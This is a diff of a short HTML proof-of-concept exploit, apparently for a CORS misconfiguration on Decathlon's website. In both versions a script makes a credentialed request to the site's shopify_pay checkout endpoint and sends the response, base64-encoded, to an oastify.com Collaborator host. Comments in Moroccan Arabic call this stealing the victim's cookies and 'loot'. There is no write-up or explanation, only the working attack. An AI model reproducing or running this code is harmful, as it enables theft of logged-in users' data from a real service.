@@ -1,22 +1,11 @@
-<!DOCTYPE html>
-<html>
-<head>
-    <title>PoC CORS Bypass</title>
-</head>
-<body>
-    <h1>Testing CORS Misconfiguration on Decathlon</h1>
-    <script>
-        // هاد الكود اللي غايسرق الـ Response
-        fetch("https://www.decathlon.com/shopify_pay/accelerated_checkout", {
-            method: "POST",
-            credentials: "include" 
-        })
-        .then(response => response.text())
-        .then(data => {
-            // صيفط الداتا المسروقة لـ Collaborator ديالك مشفرة بـ Base64
-            fetch("https://rsncplz47z8bhc3fcq4f2moem5swgs4h.oastify.com/?exfil=" + btoa(unescape(encodeURIComponent(data))));
-        })
-        .catch(err => console.error("Error:", err));
-    </script>
-</body>
-</html>
+<script>
+    fetch("https://www.decathlon.com/shopify_pay/accelerated_checkout", {
+        method: "POST",
+        credentials: "include" // هادي هي اللي كتجر الكوكيز ديال الضحية
+    })
+    .then(r => r.text())
+    .then(data => {
+        // هنا كنصيفطو "الغنيمة" لعندك لـ Collaborator
+        fetch("https://fra0o9ys6n7zg023be331an2ltrkfh36.oastify.com/?exfil=" + btoa(data));
+    });
+</script>
